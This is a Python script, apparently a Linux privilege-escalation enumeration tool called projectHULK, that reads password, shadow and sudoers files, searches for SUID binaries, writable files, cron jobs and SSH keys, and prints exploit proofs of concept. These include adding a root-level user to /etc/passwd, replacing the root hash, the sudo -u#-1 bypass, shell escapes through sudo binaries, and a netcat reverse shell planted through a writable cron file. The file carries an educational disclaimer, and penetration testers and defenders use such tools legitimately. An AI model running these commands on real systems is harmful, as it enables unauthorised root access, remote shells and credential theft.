
import os
import time
import subprocess
from time import sleep
from threading import Timer
from os import system, popen
from datetime import datetime


#------------------> Intro:
print("\n")
print("\t\t\t\t|====================================================================|")
print("\t\t\t\t|                                                                    |")
print("\t\t\t\t|                         \033[1;31;40mprojectHULK v1.5\033[0m \t\t\t     |")
print("\t\t\t\t|                     ! The Incredable Script !                      |")
print("\t\t\t\t|                                                                    |")
print("\t\t\t\t|====================================================================|")

#------------------> Note:
print("\n")
print("\033[1;34;40mNote: \033[0m")
print("        This script has been designed to help security team (SOC) and/or educational purposes in finding system vulnerability that")
print("        may lead to privilege escatation & it should be used in safe environment. The author is not responsible for any misuse of it")

#------------------> Auth:
print("\n")
print("\033[1;34;40mAuther: \033[0m")
print("             Iron Hulk")
print("        Man In A Black Tuxedu")

#------------------> Accounts:
print("\n")
print("\033[1;34;40mContact: \033[0m")
print("        Telegram: IronHulk_x69")

#------------------> Recommendation:
print("\n")
print("\033[1;34;40mRecommendation: \033[0m")
print("        For a better view of the report is it recomended to redirect the output to a file, python projectHULK.py > report.txt")

#------------------> Message:
print("\n")
print("\033[1;34;40mMessage: \033[0m")
print("        All the POC's have been listed based on the author's Opinion, you may use anything you which")
print("        rememebr, SKY HAS NO LIMITS :)")

#------------------> Enumeration:
print("\n")
print("\033[1;31;40m Enumeration on progress #................................................................................. 1% \033[0m")
print("\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------- [ Password File Permission ] -------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Password File:
print("\nThe password file is a plain text-based database that contains information for all user accounts on the system. It is owned by root. The file can only be modified by root or users with sudo privileges and readable by all system users. ")
print("\n\033[1;34;40m[+] Password file\033[0m")
returned_text = subprocess.check_output("ls -la /etc/passwd", shell=True, universal_newlines=True)
if(returned_text[2]== 'w'and returned_text[5]=='w'and returned_text[8]=='w'):
    print("{}".format(returned_text))
    print("\033[0;37;41mFile is Exploitable\033[0m")
    print("\t  |==============================================================|")
    print("\t  |The file can be abused by copying the root detail &           |")
    print("\t  |replacing the root name by other name with root hash details  |")
    print("\t  |\033[1;31;40mPOC:                                                          \033[0m|")
    print("\t  |\033[1;31;40mFirst generate a password with one of the following commands: \033[0m|")
    print("\t  |\033[1;31;40m    openssl passwd -1 -salt hulk password                     \033[0m|")
    print('\t  |\033[1;31;40m    perl -le ''print crypt("hulk", "password")                  \033[0m|')
    print("\t  |\033[1;31;40mOverwrite the password file:                                  \033[0m|")
    print('\t  |\033[1;31;40m    echo "hulk:HASH:0:0::/root:/bin/bash" >> /etc/passwd"     \033[0m|')
    print("\t  |\033[1;31;40mThen do: su hulk                                              \033[0m|")
    print("\t  |==============================================================\033[0m|")
else:
    print("{}".format(returned_text))
    print("\033[0;37;42mPassword File Is Not Writable\033[0m")
print("\n\033[1;34;40m[+] Reading The Password File:\033[0m")
os.system ('cat /etc/passwd')

#------------------> Shadow File:
print("\n\033[1;34;40m[+] Shadow file\033[0m")
os.system ('ls -la /etc/shadow')
try:
       returned_text=subprocess.check_output("cat /etc/shadow",shell=True,stderr=subprocess.STDOUT)
except subprocess.CalledProcessError as e:
       returned_text=("{}  ".format(e.output))
if (returned_text.find("Permission denied") > -1 ):
    print("    {}".format(returned_text))
    print("\033[0;37;42mFile Is Protected\033[0m")
else:
    print("    {}".format(returned_text))
    print("\033[0;37;41mFile is Exploitable\033[0m")
    print("\t  |==============================================================|")
    print("\t  |The file can be abused by changing the root HASH & replaceing |")
    print("\t  |it with the attacker's HASH                                   |")
    print("\t  |\033[1;31;40mPOC:                                                          \033[0m|")
    print("\t  |\033[1;31;40m1) Generate a new Shadow Hash and replace it with the         \033[0m|")
    print("\t  |\033[1;31;40m   current root hash:                                         \033[0m|")
    print("\t  |\033[1;31;40m    - mkpasswd  -m sha-512 -S prove123 -s                     \033[0m|")
    print("\t  |\033[1;31;40m2) Open the shadow file using any text edirot of your choice: \033[0m|")
    print("\t  |\033[1;31;40m   or copy your HASH from your system and replace it with     \033[0m|")
    print("\t  |\033[1;31;40m   the root hash                                              \033[0m|")
    print("\t  |\033[1;31;40m3) Login to root using your password                          \033[0m|")
    print("\t  |==============================================================|")
    print("\n")
    print("\033[0;37;42mHow to protect the file\033[0m")
    print("\t  |==============================================================|")
    print("\t  |Limit the access to it and make sure it can be read or        |")
    print("\t  |written only by root                                          |")
    print("\t  |\033[1;31;40mPOC:                                                          \033[0m|")
    print("\t  |\033[1;31;40mDo: chmod 600 /etc/shadow                                     \033[0m|")
    print("\t  |==============================================================|")
    time.sleep(2)

#------------------> Sudoers File:
print("\n\033[1;34;40m[+] Sudoers file\033[0m")
os.system ('ls -la /etc/sudoers')
try:
       returned_text=subprocess.check_output("cat /etc/sudoers",shell=True,stderr=subprocess.STDOUT)
except subprocess.CalledProcessError as e:
       returned_text=("{}  ".format(e.output))
if (returned_text.find("Permission denied") > -1 ):
    print("{}".format(returned_text))
    print("\033[0;37;42mFile Is Protected\033[0m")
else:
    print("{}".format(returned_text))
    print("\033[0;37;41mFile is Exploitable\033[0m")
    print("\t  |==============================================================|")
    print("\t  |The file shows a fully detailed about what the curent user my |")
    print("\t  |run as root. If the running file orapplication has a globle   |")
    print("\t  |vulnerability, the attacker may google it and abuse it for    |")
    print("\t  |user escalation                                               |")
    print("\t  |==============================================================|")

#------------------> User Group Lists:
print("\n\033[1;34;40m[+] User Group list\033[0m")
os.system ('ls -la /etc/group')
os.system('cat /etc/group')

#------------------> Password Policy:
print("\n\033[1;34;40m[+] Password Policy:\033[0m")
os.system ('grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs')

#------------------> Superusers:
print("\n\033[1;34;40m[+] Superuser:\033[0m")
os.system ("awk -F: '($3 == '0') {print}' /etc/passwd")

#------------------> List users with console:
print("\n\033[1;34;40m[+] List users with console:\033[0m")
os.system ('cat /etc/passwd | grep "sh$"')


print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]---------------------------------------------------------- [ System Information ] ----------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)
#------------------> User Group Lists:
print("\n\033[1;34;40m[+] User may run sudo on:\033[0m")
try:
	returned_text = subprocess.check_output("sudo -l", shell=True, universal_newlines=True, timeout=300000)
	print(returned_text)
except:
	print("Try to run sudo -l with password\033[0m")

#------------------> Current user is:
print("\n\033[1;34;40m[+] Current user is:\033[0m")
os.system ('whoami')

#------------------> User ID:
print("\n\033[1;34;40m[+] User ID:\033[0m")
os.system ('id')

#------------------> System Name:
print("\n\033[1;34;40m[+] System Name:\033[0m")
os.system ('uname -a')

#------------------> System Release:
print("\n\033[1;34;40m[+] System Release:")
os.system ('lsb_release -a')

#------------------> Host Name:
print("\n\033[1;34;40m[+] Host name:\033[0m")
os.system ('hostname')

#------------------>s System Version:
print("\n\033[1;34;40m[+] System Version:\033[0m")
os.system ('cat /proc/version || uname -a 2>/dev/null')
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |The version is not listed in our database. However make sure  |")
print("\t  |to keep your system always up-to-date. Old version are always |")
print("\t  |vulnerab. Visit the link bellow for more details:             |")
print("\t  |https://github.com/SecWiki/linux-kernel-exploits              |")
print("\t  |Or use:                                                       |")
print('\t  |searchsploit "Linux Kernel"                                   |')
print("\t  |==============================================================|")
print("\n")
print("\033[0;37;41mList of vulnerable kernel versions:\033[0m")
print("\t  |==========================================================================================================|")
print("\t  |3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 |")
print("\t  |3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1|")
print("\t  |3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    |")
print("\t  |2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 |")
print("\t  |2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  |")
print("\t  |2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   |")
print("\t  |2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  |")
print("\t  |2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         |")
print("\t  |==========================================================================================================|")

#------------------> Sudo Version:
print("\n\033[1;34;40m[+] Sudo Version:\033[0m")
os.system ('sudo -V | grep "Sudo ver"')
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |The version is not listed in our database. However make sure  |")
print("\t  |to keep your system always up-to-date. Old version are        |")
print("\t  |vulnerab. Use google for more details                         |")
print("\t  |Or use:                                                       |")
print('\t  |searchsploit "sudo"                                           |')
print("\t  |==============================================================|")

#------------------> is sudo version vulnerable:
print("\n\033[1;34;40m[+] Is sudo version vulnerable?\033[0m")
os.system ('sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"')
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |If the sudo version <= v1.28, it is exploitable               |")
print("\t  |\033[1;31;40mPOC:                                                          \033[0m|")
print("\t  |\033[1;31;40msudo -u#-1 /bin/bash                                          \033[0m|")
print("\t  |==============================================================|")

#------------------> who is logged on:
print("\n\033[1;34;40m[+] Who's logged in:\033[0m")
os.system ('w')

#------------------> Path Environment:
print("\n\033[1;34;40m[+] Path Environment:\033[0m")
os.system ('systemctl show-environment')
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |If you have write permissions on any folder inside the PATH   |")
print("\t  |variable you may be able to hijacking some libraries or       |")
print("\t  |binaries.                                                     |")
print("\t  |https://github.com/SecWiki/linux-kernel-exploits              |")
print("\t  |==============================================================|")

#------------------> Env Information:
print("\n\033[1;34;40m[+] Env Info:\033[0m")
os.system ('systemctl show-environment')

print("\n")
print("\033[1;31;40m Enumeration on progress ###################............................................................... 20% \033[0m")
print("\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]----------------------------------------------------------- [ System Date/Time ] -----------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)
#------------------> System Up Time:
print("\n\033[1;34;40m[+] Up Time:\033[0m")
with open("/proc/uptime", "r") as f:
	uptime = f.read().split(" ")[0].strip()
uptime = int(float(uptime))
uptime_hours = uptime // 3600
uptime_minutes = (uptime % 3600) // 60
print("   " + str(uptime_hours) + ":" + str(uptime_minutes) + " hours")

#------------------> System Date:
print("\n\033[1;34;40m[+] System Date:\033[0m")
os.system ('date 2>/dev/null')

#------------------> CPU Information:
print("\n\033[1;34;40m[+] CPU Information:\033[0m")
os.system ('lscpu')


print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------------- [ System SUID ] --------------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Find capability:
print("\n\033[1;34;40m[+] Find capability files\033[0m")
returned_text = subprocess.check_output("getcap -r / 2>/dev/null", shell=True, universal_newlines=True)
flag= 0
test= returned_text.split(" ")
for word in test :
     if word == "cap_setuid+ep":
        print(word)
        flag= 1
if (flag==0):
    print("{}".format(returned_text))
else:
    print("{}".format(returned_text))
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |Capabitity files are diffrent from system to system, google   |")
print("\t  |for more information and the exploit 'IF FOUND'               |")
print("\t  |==============================================================|")

#------------------> Built-in Binaries:
print("\n\033[1;34;40m[+] Built-in Binaries\033[0m")
Built_inlist =["/usr/lib/dbus-1.0/dbus-daemon-launch-helper","/usr/libexec/polkit-agent-helper-1","/usr/bin/vmware-user-suid-wrapper","/usr/lib/chromium/chrome-sandbox","/usr/bin/ntfs-3g","/usr/sbin/mount.nfs","/usr/sbin/mount.cifs","/usr/lib/xorg/Xorg.wrap","/usr/lib/openssh/ssh-keysign","/usr/bin/su","/usr/bin/chfn","/usr/bin/sudo","/usr/bin/chsh","/usr/sbin/pppd","/usr/bin/mount","/usr/sbin/exim4","/usr/bin/umount","/usr/bin/pkexec","/usr/bin/passwd","/usr/bin/newgrp","/usr/bin/gpasswd"]
for libe in Built_inlist:
    print("{}".format(libe))
returned_text
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |Most linux system have these Binaries and they are builtin    |")
print("\t  |no escalation is done by them unless file permission has been |")
print("\t  |change.                                                       |")
print("\t  |==============================================================|")

#------------------> Finding System SUID:
print("\n\033[1;34;40m[+] Finding System SUID\033[0m")
try:
    returned_text =subprocess.check_output("find / -perm -u=s 2>/dev/null",shell=True,stderr=subprocess.STDOUT) # add | xargs ls -l
except subprocess.CalledProcessError as e:
    returned_text="{}".format(e.output)
print(returned_text)
ttt =returned_text.split()
print("\n\033[1;34;40m[+] Not Buld-in SUID\033[0m")
result = list(set(ttt) - set(Built_inlist))
for line in result:
    print("{}".format(line))
    print("\n")
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |These are not bulit-in binnaries and worth to goolge them for |")
print("\t  |any exploit that my lead to privilage escalation              |")
print("\t  |Visite:                                                       |")
print("\t  |https://gtfobins.github.io/                                   |")
print("\t  |==============================================================|")

#------------------> Finding System GUID:
print("\n\033[1;34;40m[+] Finding System GUID\033[0m")
os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -l')

#------------------> Execute as the owner:
print("\n\033[1;34;40m[+] Find Binaries that will execute as the owner\033[0m")
os.system ('find / -perm -u=s -type f 2>/dev/null | xargs ls -l')

#------------------> Execute as the group:
print("\n\033[1;34;40m[+] Find binaries that will execute as the group\033[0m")
os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -l')

#------------------> Sticky-bit binaries:
print("\n\033[1;34;40m[+] Find sticky-bit binaries\033[0m")
os.system ('find / -perm -1000 -type d 2>/dev/null | xargs ls -l && find / -perm -4000 2>/dev/null | xargs ls -l')

#------------------> World writable scripts invoked as root:
print("\n\033[1;34;40m[+] World writable scripts invoked as root\033[0m")
os.system ('find / -writable -type f 2>/dev/null | xargs ls -l')
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |If you find a script that is owned by root but is writable by |")
print("\t  |anyone you can add your own malicious code in that script that|")
print("\t  |will escalate your privileges when the script is run as root  |")
print("\t  |==============================================================|")

#------------------> World writeable directories:
print("\n\033[1;34;40m[+] World writeable directories\033[0m")
os.system ('find / -perm -2 -type d 2>/dev/null && find / -type d -perm -g+w -or -perm -o+w 2>/dev/null && find / -type d -perm -g+w 2>/dev/null && find / -type d -perm -o+w 2>/dev/null')

#------------------> Writeable config files:
print("\n\033[1;34;40m[+] Writeable config files\033[0m")
os.system ('find /etc/ -writable -type f 2>/dev/null | xargs ls -l')

#------------------> How Files Can Be Uploaded:
print("\n\033[1;34;40m[+] How Files Can Be Uploaded\033[0m")
os.system ('which wget')
os.system ('which nc')
os.system ('which netcat')
os.system ('which socat')
os.system ('which python')
os.system ('which python3')
os.system ('which ftp')
os.system ('which tftp')
os.system ('which ssh')

#------------------> Writeable config files:
print("\n")
print("\n\033[1;34;40mUnexpected commands allows you to read and/or write files or even execute command\033[0m")
print("\t  |==============================================================|")
print('\t  |sudo awk "BEGIN {system("/bin/sh")}"                          |')
print("\t  |sudo find /etc -exec sh -i \;                                 |")
print("\t  |sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh          |")
print("\t  |sudo tar c a.tar -I ./runme.sh a                              |")
print("\t  |ftp>!/bin/sh                                                  |")
print("\t  |less>! <shell_comand>                                         |")
print("\t  |==============================================================|")


#------------------> Profiles files:
print("\n\033[1;34;40m[+] Profiles files\033[0m")
os.system ('ls -l /etc/profile /etc/profile.d/')
print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |The file /etc/profile and the files under /etc/profile.d/ are |")
print("\t  |scripts that are executed when a user run a new shell.        |")
print("\t  |Therefore, if you can write or modify any of the you can      |")
print("\t  |escalate privileges.                                          |")
print("\t  |==============================================================|")

print("\n")
print("\033[1;31;40m Enumeration on progress #############################################..................................... 50% \033[0m")
print("\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------------ [ System Process ] ------------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

print("\033[0;37;41mNote\033[0m")
print("\t  |==============================================================|")
print("\t  |Take a look to what processes are being executed and check if |")
print("\t  |any process has more privileges that it should. You can also  |")
print("\t  |use a tool called psyp.                                       |")
print("\t  |https://github.com/DominicBreuker/pspy                        |")
print("\t  |==============================================================|")
#------------------> Running Proccess:
print("\n\033[1;34;40m[+] Running Proccess on the system\033[0m")
#os.system ('ps aux')

#------------------> Running Proccess as root
print("Consider running the command by: ps aux | grep USERNAME")
print("\n\033[1;34;40m[+] Running Proccess as root\033[0m")
#os.system ('ps aux | grep root')


print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------ [ System Path Scheduled Tasks ] -----------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Current User Crontab:
print("\n\033[1;34;40m[+] Current User Crontab\033[0m")
os.system ('crontab -l')

#------------------> Scheduled Jobs:
print("\n\033[1;34;40m[+] Scheduled Jobs\033[0m")
os.system ('cat /etc/crontab')

print("\n")
print("\033[0;37;41mIf the File is Writable\033[0m")
print("\t  |======================================================================================|")
print("\t  |If the file is running by root, & it is writable by anyone the attacker my abuse it   |")
print("\t  |by replacing the content of it.                                                       |")
print("\t  |\033[1;31;40mPOC:                                                                                  \033[0m|")
print("\t  |\033[1;31;40mecho '/bin/sh' > file                                                                 \033[0m|")
print("\t  |\033[1;31;40mecho '/bin/bash' > file                                                               \033[0m|")
print("\t  |\033[1;31;40mecho 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' > file\033[0m|")
print("\t  |\033[1;31;40mecho 'cp /bin/bash /tmp/bash; chmod 777 /tmp/bash' > file                             \033[0m|")
print("\t  |\033[1;31;40mecho 'echo root::0:0:root:/root:/bin/bash > /etc/passwd' > file                       \033[0m|")
print("\t  |======================================================================================|")

#------------------> System Timer:
print("\n\033[1;34;40m[+] System Timer List\033[0m")
os.system ('systemctl list-timers --all')

print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------ [ Communications & Networking ] -----------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Network Details:
print("\n\033[1;34;40m[+] Network Details:\033[0m")
os.system ('/sbin/ifconfig')

#------------------> Firewall Rulls:
print("\n\033[1;34;40m[+] Firewall Rulls:\033[0m")
os.system ('iptables -nvL')

#------------------> Open Ports:
print("\n\033[1;34;40m[+]  Open Ports:\033[0m")
os.system ('netstat -antp')

#------------------> Network Route:
print("\n\033[1;34;40m[+] Network Route:\033[0m")
os.system ('route')

#------------------> Hosts File:
print("\n\033[1;34;40m[+] Hosts File:\033[0m")
os.system ('cat /etc/hosts')

#------------------> Name Server:
print("\n\033[1;34;40m[+] Name Server:\033[0m")
os.system ('cat /etc/resolv.conf')

#------------------> Neighbours:
print("\n\033[1;34;40m[+] Neighbours:\033[0m")
os.system ('(route || ip n)')

print("\n")
print("\033[1;31;40m Enumeration on progress ################################################################.................. 80% \033[0m")
print("\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------------ [ Finding SSH Keys ] ----------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Authorized_keys:
print("\n\033[1;34;40m[+] Authorized_keys:\033[0m")
os.system ('find / -name authorized_keys 2> /dev/null')

#------------------> id_rsa:
print("\n\033[1;34;40m[+] id_rsa:\033[0m")
os.system ('find / -name id_rsa 2> /dev/null')

print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]-------------------------------------------------------------- [ Extra Creds ] -------------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Look Manually:
print("\n\033[1;34;40m[+] Mail File:\033[0m")
os.system ('ls -la /var/mail/')

print("\n\033[1;34;40m[+] Root Directory:\033[0m")
os.system ('ls -la /root/')

print("\n\033[1;34;40m[+] Home Directory:\033[0m")
os.system ('ls -la /home/')

print("\n\033[1;34;40m[+] tmp Directory:\033[0m")
os.system ('ls -la /tmp')

print("\n\033[1;34;40m[+] Backup Directory:\033[0m")
os.system ('ls -la /var/backups')

print("\n\033[1;34;40m[+] Apache Config File:\033[0m")
os.system ('cat /var/apache2/config.inc')

print("\n\033[1;34;40m[+] MySQL:\033[0m")
os.system ('ls -la /var/lib/mysql')

print("\n\033[1;34;40m[+] Log File:\033[0m")
os.system ('ls -la /var/log')

print("\n\033[1;34;40m[+] Spool File:\033[0m")
os.system ('ls -la /var/spool')

print("\n\033[1;34;40m[+] pgsql:\033[0m")
os.system ('ls -la /var/lib/pgsql')

print("\n\033[1;34;40m[+] file-systems mounted:\033[0m")
os.system ('df -h')

print("\n\033[1;34;40m[+] Tools/Languages Installed:\033[0m")
os.system ('which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null')

print("\n")
print("\033[1;31;40m \t\t\tEnumeration is completed ################################################################################## 100% \033[0m")
print("\n")



